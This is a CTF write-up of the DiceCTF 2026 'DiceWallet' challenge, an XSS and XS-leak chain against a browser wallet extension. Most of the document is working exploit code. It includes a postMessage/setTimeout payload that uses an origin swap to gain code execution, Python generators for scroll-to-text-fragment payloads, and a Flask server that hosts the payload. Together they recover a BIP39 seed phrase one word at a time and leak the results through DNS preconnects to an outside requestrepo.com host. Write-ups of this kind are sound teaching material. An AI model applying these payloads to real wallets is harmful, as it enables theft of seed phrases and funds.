# DiceCTF Quals 2026

## DiceWallet

This was an XSS challenge, which used a firefox extension, and lots of event hooks. 

### Initial Pivot
The extension only exposed useful functions to localhost:8080, which was "privileged" domain. So the goal was to get XSS there to communicate with extension.

Scanning the source, I found interesting bit in inpage.js - 
```js
window.addEventListener("message", (e) => {
    if (e.origin !== location.origin) return;
    if (e.data?.secret !== secret) return;
    const data = e.data;
    if (typeof window[data.fn] === "function") {
      window[data.fn](data);
    }
  });
```

So if we can post a message to localhost:8080, from same origin, it will call `window[data.fn](data)`, which is clearly suspicious. We need a postMessage sink where we can control data.

Tracing steps back, we find this in `content.js` - 
```js
chrome.runtime.onMessage.addListener((result) => {
  if (result.type === "DICE_RESPONSE") {
    result.fn = "dwOnMessage";
  } else if (result.type === "DICE_ERROR") {
    result.fn = "dwOnError";
  }
  result.secret = secret;
  window.postMessage(result, location.origin);
});
```
It broadcasts the messsages returned from background.js to the current window as same origin. It auto sets secret, so we dont have to care about it. So we need control over result, and result.type should be neither response nor error (otherwise it will overwrite result.fn).

Tracing back to background.js - 
```js
const tabId = sender.tab?.id;
const origin = sender.origin || "unknown";
if (!tabId) return;
handleRequest(msg, origin).then(result => {
      chrome.tabs.sendMessage(tabId, result);
    });
```

Notice how it responds using `tabId`. It does not check if tab origin has changed or not. This allowed hotswapping of origins, where bot loads our page, we send the extension a query msg which results in some malformed result, and till the time background.js responds, we redirect page to localhost:8080.

The background handler only rewrites the message into a normal provider response if the RPC result is truthy:

```js
const response = await handleProviderRequest(...);
if (response) {
  msg.type = "DICE_RESPONSE";
  msg.result = response;
}
```
For eth_getTransactionByHash(zeroHash), response === null.

So the original message object survives mostly unchanged, it just gets bounced back to the tab.


This is the flow - 
```
attacker page
  -> window.postMessage(payload)
  -> content.js forwards to background
  -> background does RPC
  -> reply sent back to tab
  -> content.js on current page reposts reply
  -> inpage.js dispatches window[data.fn](data)
```

My script - 
```js
let payload =[`
  alert(1)
`];
payload.type = "DICE_REQUEST";
payload.method = "eth_getTransactionByHash";
payload.params =["0x0000000000000000000000000000000000000000000000000000000000000000"];
payload.fn = "setTimeout";
window.postMessage(payload, "*");
window.location = "http://localhost:8080/admin/index.html"
```

This results in `window["setTimeout"](["alert(1)"])` being executed.


### XS-Leak
Wallet name was directly put into HTML of `popup.html`, and we could directly rename it using XSS on localhost:8080, giving us DOM Injection. 

`/export/phrase` route showed the mnemonics. Since we have DOM injection in popup, we could redirect it using meta tags to inject meta redirect, which add "STTF" fragment to URL. We also inject large empty space, and a final iframe in the end of page, which is lazy loaded, along with some random footer word.

Since BIP39 only has 2048 words, our oracle was, if STTF fragment matches a mnemonic word, no scroll happens.

But if no match is found in mnemonic, firefox will scroll till our footer word, which will load the lazy loaded iframe. Now this iframe contains a link element for DNS prefetching, with which we get info if scroll happened or not.

We could do binary search by adding multiple words to STTF query and keep reducing it to single words. Index was already present  in the DOM as prefic of each word, so after identifying a word, we just do STTF oracle for `1. <word>, 2. <word>...`.

That's it.

Here are my scripts - 

STTF_payload.py
```py
#!/usr/bin/env python3
import argparse
import json
from pathlib import Path
from urllib.parse import quote


def load_words(path: Path) -> list[str]:
    words = [line.strip() for line in path.read_text(encoding="utf-8").splitlines()]
    words = [w for w in words if w]
    if not words:
        raise SystemExit(f"no words found in {path}")
    return words


def build_fragment(words: list[str]) -> str:
    return "#/export/phrase?_am=:~:" + "&".join(
        f"text={quote(word, safe='')}" for word in words
    )


def build_padding(count: int) -> str:
    return "".join("<br>x" for _ in range(count))


def build_name_html(
    padding: str,
    tag_text: str,
    delay: str,
    meta_fragment: str,
    dns_url: str,
) -> str:
    return (
        f'<div>{padding}{tag_text}'
        f'<meta http-equiv="refresh" content="{delay};url={meta_fragment}">'
        f"<iframe loading=\"lazy\" "
        f"srcdoc='<link rel=\"preconnect\" href=\"{dns_url}\">'></iframe></div>"
    )


def build_script(
    account_index: int,
    name_html: str,
    initial_fragment: str,
) -> str:
    js_name = json.dumps(name_html)
    js_initial_fragment = json.dumps(initial_fragment)
    return f"""(async function extractMnemonic() {{
    let x = "";
    for (let i = 0; i < 100; i++) {{
        x += "<br>x";
    }}

    await window.ethereum.request({{
        method: "wallet_renameAccount",
        params: [{{
            index: {account_index},
            name: {js_name}
        }}]
    }});

    const accounts = await window.ethereum.request({{ method: "eth_requestAccounts" }});
    setTimeout(() => {{
        window.location = "about:blank";
    }}, 10000);
    await window.ethereum.request({{
        method: "eth_signTypedData_v4",
        params: [
            accounts[0],
            {{
                domain: {{}},
                types: {{
                    EIP712Domain: [],
                    Clobber: [{{ name: "payload", type: "string" }}]
                }},
                primaryType: "Clobber",
                message: {{
                    payload: {js_initial_fragment}
                }}
            }}
        ]
    }});
}})();"""


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate the multi-word STTF payload from the first or second half of bip39.txt."
    )
    parser.add_argument(
        "--wordlist",
        default="bip39.txt",
        help="path to the word list file (default: bip39.txt)",
    )
    parser.add_argument(
        "--half",
        default="f",
        help="which half of the word list to use (default: first)",
    )
    parser.add_argument(
        "--account-index",
        type=int,
        default=0,
        help="wallet account index to rename (default: 0)",
    )
    parser.add_argument(
        "--padding-count",
        type=int,
        default=100,
        help="number of '<br>x' padding chunks to prepend (default: 100)",
    )
    parser.add_argument(
        "--tag-text",
        default="hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii",
        help="plain text prefix before the meta tag (default: the current marker string)",
    )
    parser.add_argument(
        "--delay",
        default="1",
        help="meta refresh delay in seconds (default: 1)",
    )
    parser.add_argument(
        "--dns-url",
        default="https://abcde.oab1qna7.requestrepo.com",
        help="URL used inside the lazy iframe srcdoc preconnect",
    )
    parser.add_argument(
        "--initial-fragment",
        default="#/export/phrase?_am=",
        help="fragment used in the eth_signTypedData_v4 route-confusion step (default: #/export/phrase)",
    )
    parser.add_argument(
        "--print-words",
        action="store_true",
        help="also print the selected words before the payload",
    )
    args = parser.parse_args()

    words = load_words(Path(args.wordlist))
    selected = words
    

    for char in args.half:
        mid = len(selected) // 2
        if char == 'f':
            selected = selected[:mid]
        elif char == 'l':
            selected = selected[mid:]
        
        # Optional: Break early if the list is empty or has one element
        if len(selected) <= 1:
            break
    selected.insert(0, "xhiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii")
    fragment = build_fragment(selected)
    padding = build_padding(args.padding_count)
    name_html = build_name_html(
        padding=padding,
        tag_text=args.tag_text,
        delay=args.delay,
        meta_fragment=fragment,
        dns_url=f"https://{args.half}.oab1qna7.requestrepo.com",
    )
    payload = build_script(
        account_index=args.account_index,
        name_html=name_html,
        initial_fragment=args.initial_fragment,
    )

    if args.print_words:
        print(f"// using {len(selected)} words from the {args.half} half")
        print("// " + ", ".join(selected))
        print()

    print(payload)


if __name__ == "__main__":
    main()
```
This generates STTF XSS payload to be run on localhost:8080.



order_payload.py - 
```py
#!/usr/bin/env python3
import argparse
import json
from urllib.parse import quote


MARKER = "xhiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii"


def build_fragment(probes: list[str]) -> str:
    return "#/export/phrase?_am=:~:" + "&".join(
        f"text={quote(probe, safe='')}" for probe in probes
    )


def build_padding(count: int) -> str:
    return "".join("<br>x" for _ in range(count))


def build_name_html(
    padding: str,
    tag_text: str,
    delay: str,
    meta_fragment: str,
    dns_url: str,
) -> str:
    return (
        f'<div>{padding}{tag_text}'
        f'<meta http-equiv="refresh" content="{delay};url={meta_fragment}">'
        f"<iframe loading=\"lazy\" "
        f"srcdoc='<link rel=\"preconnect\" href=\"{dns_url}\">'></iframe></div>"
    )


def build_script(
    account_index: int,
    name_html: str,
    initial_fragment: str,
) -> str:
    js_name = json.dumps(name_html)
    js_initial_fragment = json.dumps(initial_fragment)
    return f"""(async function extractMnemonic() {{
    let x = "";
    for (let i = 0; i < 100; i++) {{
        x += "<br>x";
    }}

    await window.ethereum.request({{
        method: "wallet_renameAccount",
        params: [{{
            index: {account_index},
            name: {js_name}
        }}]
    }});

    const accounts = await window.ethereum.request({{ method: "eth_requestAccounts" }});
    setTimeout(() => {{
        window.location = "about:blank";
    }}, 10000);
    await window.ethereum.request({{
        method: "eth_signTypedData_v4",
        params: [
            accounts[0],
            {{
                domain: {{}},
                types: {{
                    EIP712Domain: [],
                    Clobber: [{{ name: "payload", type: "string" }}]
                }},
                primaryType: "Clobber",
                message: {{
                    payload: {js_initial_fragment}
                }}
            }}
        ]
    }});
}})();"""


def build_probes(word: str, start: int, end: int) -> list[str]:
    if start < 1 or end < 1:
        raise SystemExit("positions must be 1-based positive integers")
    if end < start:
        raise SystemExit("end position must be greater than or equal to start position")
    return [f"{pos}. {word}" for pos in range(start, end + 1)]


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate an STTF payload that probes a single mnemonic word across an inclusive position range."
    )
    parser.add_argument(
        "word",
        help="mnemonic word to probe",
    )
    parser.add_argument(
        "start",
        type=int,
        help="starting 1-based position to probe",
    )
    parser.add_argument(
        "end",
        type=int,
        help="ending 1-based position to probe",
    )
    parser.add_argument(
        "--account-index",
        type=int,
        default=0,
        help="wallet account index to rename (default: 0)",
    )
    parser.add_argument(
        "--padding-count",
        type=int,
        default=100,
        help="number of '<br>x' padding chunks to prepend (default: 100)",
    )
    parser.add_argument(
        "--tag-text",
        default="hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii",
        help="plain text prefix before the meta tag (default: the current marker string)",
    )
    parser.add_argument(
        "--delay",
        default="1",
        help="meta refresh delay in seconds (default: 1)",
    )
    parser.add_argument(
        "--dns-url",
        default="https://abcde.oab1qna7.requestrepo.com",
        help="URL used inside the lazy iframe srcdoc preconnect",
    )
    parser.add_argument(
        "--initial-fragment",
        default="#/export/phrase?_am=",
        help="fragment used in the eth_signTypedData_v4 route-confusion step (default: #/export/phrase?_am=)",
    )
    parser.add_argument(
        "--print-words",
        action="store_true",
        help="also print the selected probes before the payload",
    )
    args = parser.parse_args()

    selected = [MARKER, *build_probes(args.word, args.start, args.end)]
    fragment = build_fragment(selected)
    padding = build_padding(args.padding_count)
    name_html = build_name_html(
        padding=padding,
        tag_text=args.tag_text,
        delay=args.delay,
        meta_fragment=fragment,
        dns_url=args.dns_url,
    )
    payload = build_script(
        account_index=args.account_index,
        name_html=name_html,
        initial_fragment=args.initial_fragment,
    )

    if args.print_words:
        print(f"// probing {args.word!r} across positions {args.start}-{args.end}")
        print("// " + ", ".join(selected))
        print()

    print(payload)


if __name__ == "__main__":
    main()

```
This is almost same as sttf_payload.py, but its for identifying the index after word identification.


and finally, server.py - 
```py
from flask import Flask
import json

app = Flask(__name__)

@app.route("/p")
def payload():
    
    z = ""
    with open("z.js", "r") as f:
        z = f.read()
    p = """
<script>
let payload =["""+json.dumps(z)+"""];
payload.type = "DICE_REQUEST";
payload.method = "eth_getTransactionByHash";
payload.params =["0x0000000000000000000000000000000000000000000000000000000000000000"];
payload.fn = "setTimeout";
payload.data = {"idK":1}
window.postMessage(payload, "*");
window.location = "http://localhost:8080/admin/index.html"
</script>
"""
    return p

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5050)
```

It reads fresh payloads from z.js, and wraps it in the XSS pivot to localhost:8080. Then we sumbit URL to bot, check request repo for DNS query, and keep doing till we pinpoint all words and their order.